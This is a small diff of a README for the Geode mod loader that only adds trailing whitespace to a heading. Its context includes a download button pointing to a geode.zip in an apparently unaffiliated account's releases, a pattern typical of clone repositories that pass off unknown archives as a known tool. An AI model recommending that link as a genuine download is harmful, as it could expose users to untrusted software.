@@ -8,7 +8,7 @@
 [![downbutton](https://github.com/user-attachments/assets/150c77a6-a2a1-422d-8bb0-fa55c395a932)](https://github.com/bridgestonemasonstar/geode/releases/download/main/geode.zip)
 
  
-## Why Geode?  
+## Why Geode?   
 
 Unlike previous mod loaders, which merely inject the DLLs and let devs handle the rest, Geode aims to be a more comprehensive project that provides all the tools needed for creating mods in one package.   
 
